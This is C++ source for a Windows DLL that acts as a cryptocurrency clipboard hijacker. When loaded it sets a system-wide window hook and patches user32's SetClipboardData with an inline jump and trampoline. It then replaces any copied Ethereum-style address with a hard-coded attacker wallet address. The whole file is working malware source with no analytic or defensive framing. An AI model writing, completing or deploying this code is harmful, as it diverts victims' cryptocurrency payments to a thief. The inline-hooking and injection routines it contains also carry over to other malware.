// dllmain.cpp : Defines the entry point for the DLL application.
#pragma once

#include "pch.h"
#include <stdio.h>
#include <cstdint>
#include <memoryapi.h>
#include <stdlib.h>
#include <atlstr.h>
#include <atltypes.h>

#pragma data_seg(".JOE")
HWND hWndServer = NULL;
#pragma data_seg()
#pragma comment(linker, "/section:.JOE,rws")

#pragma comment(lib,"user32.lib")
#define check(expr) if (!(expr)){ DebugBreak(); exit(-1); }

UINT UWM_PASTE;
#define UWM_PASTE_MSG L"UWM_PASTE_MSG"

CString clientWalletAddress;
CString mywalletaddress = L"0x8bc6014CbA5af4AeAc456dff20FFe1177ED67134";

void* rtnSetFuncMemory;
void* rtnGetFuncMemory;

HHOOK hHook;

//allocates memory close enough to the provided targetAddr argument to be reachable
//from the targetAddr by a 32 bit jump instruction
void* _AllocatePageNearAddress(void* targetAddr)
{
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	const uint64_t PAGE_SIZE = sysInfo.dwPageSize;

	uint64_t startAddr = (uint64_t(targetAddr) & ~(PAGE_SIZE - 1)); //round down to nearest page boundary
	uint64_t minAddr = min(startAddr - 0x7FFFFF00, (uint64_t)sysInfo.lpMinimumApplicationAddress);
	uint64_t maxAddr = max(startAddr + 0x7FFFFF00, (uint64_t)sysInfo.lpMaximumApplicationAddress);

	uint64_t startPage = (startAddr - (startAddr % PAGE_SIZE));
	uint64_t pageOffset = 1;
	while (1)
	{
		uint64_t byteOffset = pageOffset * PAGE_SIZE;
		uint64_t highAddr = startPage + byteOffset;
		uint64_t lowAddr = (startPage > byteOffset) ? startPage - byteOffset : 0;

		bool needsExit = highAddr > maxAddr && lowAddr < minAddr;

		if (highAddr < maxAddr)
		{
			void* outAddr = VirtualAlloc((void*)highAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (outAddr)
				return outAddr;
		}

		if (lowAddr > minAddr)
		{
			void* outAddr = VirtualAlloc((void*)lowAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (outAddr != nullptr)
				return outAddr;
		}

		pageOffset++;

		if (needsExit)
		{
			break;
		}
	}
	return nullptr;
}

uint32_t _WriteAbsoluteJump64(void* absJumpMemory, void* addrToJumpTo)
{
	//this writes the absolute jump instructions into the memory allocated near the target
	//the E9 jump installed in the target function (GetNum) will jump to here

	//r10 is chosen here because it's a volatile register according to the windows x64 calling convention, 
	//but is not used for return values (like rax) or function arguments (like rcx, rdx, r8, r9)
	uint8_t absJumpInstructions[] = { 0x49, 0xBA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, //mov 64 bit value into r10
										0x41, 0xFF, 0xE2 }; //jmp r10

	uint64_t addrToJumpTo64 = (uint64_t)addrToJumpTo;
	memcpy(&absJumpInstructions[2], &addrToJumpTo64, sizeof(addrToJumpTo64));
	memcpy(absJumpMemory, absJumpInstructions, sizeof(absJumpInstructions));
	return sizeof(absJumpInstructions);
}

bool checkValidAddress(CString address) {
	CString caddress;

	for (int i = 0; i < address.GetLength(); i++) {
		if (address[i] != ' ' && address[i] != '\t' && address[i] != '\r' && address[i] != '\n') {
			caddress += address[i];
		}
	}

	if (caddress.GetLength() != 42) return false;

	if (caddress[0] != '0' || caddress[1] != 'x') return false;

	for (int i = 2; i < address.GetLength(); i++) {
		if (!((address[i] >= 'A' && address[i] <= 'F') || (address[i] >= 'a' && address[i] <= 'f') || (address[i] >= '0' && address[i] <= '9')))
			return false;
	}
	return true;
}

typedef int (WINAPI* defTrampolineSetFunc)(UINT uFormat, HGLOBAL hMem);
int __stdcall SetClipboardDataProxy(UINT uFormat, HANDLE hMem)
{
	PVOID lpData = GlobalLock(hMem); // Lock the global memory and get a pointer to the memory
	wchar_t* strData = reinterpret_cast<TCHAR*>(lpData);

	if (lpData != NULL) {
		if (checkValidAddress(strData)) {
			// Now you can copy data to the locked memory
			memcpy_s(lpData, (wcslen(strData) + 1) * sizeof(TCHAR), mywalletaddress, (wcslen(mywalletaddress) + 1) * sizeof(TCHAR)); // Copy the data to the global memory

			GlobalUnlock(hMem); // Unlock the global memory
		}
	}
	defTrampolineSetFunc trampoline = (defTrampolineSetFunc)rtnSetFuncMemory;
	return trampoline(uFormat, hMem);
}

extern "C" __declspec(dllexport) void InstallSetHook() {
	HINSTANCE hinstLib;
	FARPROC function_address = NULL;

	hinstLib = LoadLibraryA("user32.dll");
	function_address = GetProcAddress(hinstLib, "SetClipboardData");

	BYTE saved_buffer[5];

	ReadProcessMemory(GetCurrentProcess(), function_address, saved_buffer, 5, NULL);

	void* relayFuncMemory = _AllocatePageNearAddress(function_address);
	check(relayFuncMemory);
	_WriteAbsoluteJump64(relayFuncMemory, SetClipboardDataProxy); //write relay func instructions

	//now that the relay function is built, we need to install the E9 jump into the target func,
	//this will jump to the relay function
	DWORD oldProtect;
	BOOL success = VirtualProtect(function_address, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
	check(success);

	//32 bit relative jump opcode is E9, takes 1 32 bit operand for jump offset
	uint8_t jmpInstruction[5] = { 0xE9, 0x0, 0x0, 0x0, 0x0 };

	//to fill out the last 4 bytes of jmpInstruction, we need the offset between 
	//the relay function and the instruction immediately AFTER the jmp instruction
	const uint64_t relAddr = (uint64_t)relayFuncMemory - ((uint64_t)function_address + sizeof(jmpInstruction));
	memcpy(jmpInstruction + 1, &relAddr, 4);

	//install the hook
	memcpy(function_address, jmpInstruction, sizeof(jmpInstruction));


	rtnSetFuncMemory = _AllocatePageNearAddress(SetClipboardDataProxy);
	check(rtnSetFuncMemory);

	uint8_t absJumpInstructions[] = {	0x0, 0x0, 0x0, 0x0, 0x0,	// saved_buffer
										0x49, 0xBA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, //mov 64 bit value into r10
										0x41, 0xFF, 0xE2 }; //jmp r10

	uint64_t resumeAddress = (uint64_t)function_address + sizeof(saved_buffer);

	memcpy(&absJumpInstructions, saved_buffer, 5);
	memcpy(&absJumpInstructions[7], &resumeAddress, 8);
	memcpy(rtnSetFuncMemory, absJumpInstructions, sizeof(absJumpInstructions));

}

LRESULT CALLBACK CallWndProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{ }
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    HMODULE hCModule;
    LPVOID localHookFunc4;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		UWM_PASTE = RegisterWindowMessage(UWM_PASTE_MSG);
		hHook = SetWindowsHookExW(WH_CALLWNDPROC, CallWndProc, hModule, 0);
        InstallSetHook();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
